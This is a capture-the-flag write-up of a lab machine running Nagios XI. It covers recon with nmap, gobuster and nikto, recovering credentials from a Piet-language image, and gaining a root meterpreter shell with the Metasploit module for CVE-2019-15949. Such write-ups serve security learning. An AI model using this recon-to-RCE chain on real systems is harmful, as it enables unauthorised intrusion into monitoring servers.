## Description:

Identify the critical security flaw in the most powerful and trusted network monitoring software on the market, that allows a user authenticated remote code execution.


## Questions:


### What hidden file did you find?

Starting off with Nmap, I scanned the box: <br>

`tas@kali$ nmap -vv -sC -sV -p- -T4 nax.thm -oN nmap/full.log` <br>

> 22/tcp   open  ssh        syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) <br>
> 25/tcp   open  smtp       syn-ack Postfix smtpd <br>
> 80/tcp   open  http       syn-ack Apache httpd 2.4.18 ((Ubuntu)) <br>
> 389/tcp  open  ldap       syn-ack OpenLDAP 2.2.X - 2.3.X <br>
> 443/tcp  open  ssl/http   syn-ack Apache httpd 2.4.18 <br>
> 5667/tcp open  tcpwrapped syn-ack

There's quite a few ports open on this server. I decided to start off by further enumerating that Apache webserver. <br>

The first thing I did was visit the homepage of the http server at nax.thm, and it was a mostly blank page with what looked like ASCII art of a butterfly on it.
There was also a bit of text on the page that read "Welcome to elements", with a list of abbreviations from the periodic table of elements.

That list of elements immediately made me suspicious that something more was going on here. Especially considering how the elemental code for Mercury "Hg" shows up twice. <br>
To me, this screamed that it was probably some sort of code, so I went and referenced those elemental labels with their atmoic numbers and noted them down in order. <br>

It came out to: 47, 80, 73, 51, 84, 46, 80, 78, 103. <br>

Heading to [CyberChef](https://gchq.github.io/CyberChef/), I plugged these values in and converted them from decimal to ASCII. <br>
Sure enough, I was met with a decoded message which appeared to be a filename: <br>

### Who is the creator of the file?

I navigated to that hidden file that I'd found and downloaded it. It appeard to be a PNG image, mostly white with some colored squares along the border. <br>

I know that images can hold a lot of useful metadata, so I used a command called `exiftool` to view that data in my terminal:

`tas@kali$ exiftool ****.PNg`

### What is the username you found?

Back to regular enumeration, I went to the homepage of the website again and checked the source code to see if I had missed anything. <br>
There was an HTML comment in the source that had the name of another endpoint: "/nagiosxi/". <br>

When I navigated there I was greeted with a login portal for Nagios XI, a popular network monitoring software.

I tried to login using a couple variations of the name I had discovered, along with some common default passwords. <br>
I was mostly just hoping to get a message that might tip me off to a potential username, but the error messages were of the typical, unhelpful: "username or password incorrect" variety. <br>

Next I checked the source for the login page to see if there would be any extra HTML comments or references to additional endpoints.
There weren't any other helpful comments, but I did find some other directories mentioned in the source. <br>

These were: <br>

1. /nagiosxi/images/ -- Indexing was disabled, so I can't direclty view the contents of this folder. <br>
2. /nagiosxi/includes/dashlets/ -- Indexing was also turned off for both folders in this path, so wasn't too helpful at the moment. <br>
3. /nagiosxi/about/ -- This endpoint was accessible, but it just had some basic and mostly useless info about the product and license. <br>


After that I decided to scan the webserver with Gobuster and Nikto: <br>

`tas@kali$ gobuster dir -u http://nax.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` <br>

`tas@kali$ nikto -h http://nax.thm` <br>


Gobuster found:

> /javascript -- But it was code 403 Forbidden <br>
> /nagios -- Which appeared to be a basic http auth login form.. <br>


Meanwhile, Nikto had an interesting piece of information to share with me.
Apparently the webserver had multiple index files in use, both index.html and index.php. <br>

Heading back to my browser, I checked nax.thm/index.html, and this was the simple page with ASCII art that I had seen earlier. <br>
nax.thm/index.php was more interesting, however. It was a simple page with a Nagios banner, but all it had was a link to the /nagiosxi/login.php panel that I had already found in the source. <br>


The basic Gobuster scan on the root of the webserver didn't find anything else interesting, so I decided to run another scan, this time on that "/nagiosxi/" endpoint: <br>

`tas@kali$ gobuster dir -u http://nax.thm/nagiosxi -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` <br>

Right away, this scan found a lot of extra endpoints. While it kept running I decided to start checking them out. <br>

![Secondary Gobuster Scan Results (Partial)](https://i.imgur.com/cGkzKQX.png)


Unfortuantely, every single one of those endpoints either redirected me to /login.php or outright denied me access since I wasn't authenticated. <br>

At this point I got stuck for quite some time. I knew that I needed to somehow find a username and password, but there didn't seem to be any leads on the webserver. <br>

I also enumerated both smtp on port 25 and ldap on port 389, using [techniques](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp) I found on [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap),
but still could not find any useful information leading to the required Nagios credentials. <br>

Eventually I decided to consult another write-up to learn what I was missing. I found the [official video walkthrough](https://www.youtube.com/watch?v=pACKQsKZUBw) for the room by John Hammond, and began to watch it.
I did not want to spoil the entire challenge for myself, so I only watched up until the moment I had realized what I was missing. <br>

<details>
<summary>Spoilers</summary>

As it turns out, that png image file from earlier in the challenge had a lot more to it than I thought or expected. <br>
It is actually a program written in an esoteric programming language known as [Piet](https://www.dangermouse.net/esoteric/piet.html). <br>
The language uses image data to store and execute the code for each program. It was named after Piet Mondrian, the name that I had seen earlier in the challenge. <br>

Had I Googled that name, I certainly would have figured this out on my own a lot sooner, but I overlooked it because I seriously did not expect the name to be relevant beyond
maybe hinting at an account username for this specific challenge. <br>
Looking back, it definitely seems like the challenge questions were trying to nudge me in the right direction, but I sort of tunneled on trying more traditional pentesting/enumeration techniques instead. <br>
</details>

Anyways, back under my own power after this revelation I began to Google and read about Piet, which brought me to this [github page](https://github.com/gleitz/npiet) with a downloadable interpreter. <br>

Following the instructions on the page, I tried to `sudo apt install libgd`, but received a package not found error. <br>
The Github page did have a comment after that command stating "MacOS", so I figured it wasn't necessary on Linux, and proceeded with the following steps: <br>
```
tas@kali$ ./configure
tas@kali$ make
```
This failed with another error though, so I double-checked by Googling libgd and found out that the Linux version of the package is called `libgd-dev`. <br>

So running `sudo apt insall libgd-dev` was successful, and afterwards running `make` again succeeded and created an `npiet` binary for me to work with. <br>

Next I ran the `npiet` command on the png file that I had found at the beginning of the challenge, but it gave me another error.

![Npiet format error](https://i.imgur.com/LWOnV7s.png)

Luckily, I recognized this error from the THM challenge page: <br>

![Npiet format error remediation instructions](https://i.imgur.com/8Hp7M4S.png)

So I opened the file in Gimp and exported it as a .ppm file, and then ran `npiet` on it again. <br>
This time my terminal began endlessly spamming seemingly random characters, so I interrupted it with ctrl+c. <br>
On closer inspection of the now-still output, I noticed that it was actually endlessly printing the same loop of characters, which appeared to be potentially a username and password. <br>
This was confirmed once I tried inputting them as answers back on the challenge page. <br>

### What is the CVE number for this vulnerability?

Back to Google again, I searched for "nagios xi authenticated rce" and immediately found a page on exploit-db which disclosed the CVE number. <br>

<details>
<summary>CVE Number</summary>

> Answer: CVE-2019-15949
</details>

### What is the full path for the exploitation module?

> `tas@kali$ msfconsole` <br>
> `msf6> search nagios` <br>

To my surprise there were actually quite a lot of metasploit modules for Nagios RCE, but a certain one stood out to me because it sounded like what I had read about in the module's code on the Exploit-DB page. <br>

<details>
<summary>Metasploit Module Name</summary>

> Answer: exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce

### Compromise the machine and locate user.txt

Using the Metasploit module that I identified above, I set the required options before running the exploit. <br>

> `msf6> set rhosts $IP` <br>
> `msf6> set lhost $MYIP` <br>
> `msf6> set password $PASS` <br>
> `msf6> exploit` <br>
> ... <br>
> `meterpreter >`

Success. <br>

After looking under the /home directory, I located user.txt in /home/galand/.

### Locate root.txt

Running the `getuid` command from within meterpreter, I could see that I was actually already root. <br>
All I had left to do was check /root for the root.txt file, and sure enough it was there. <br>
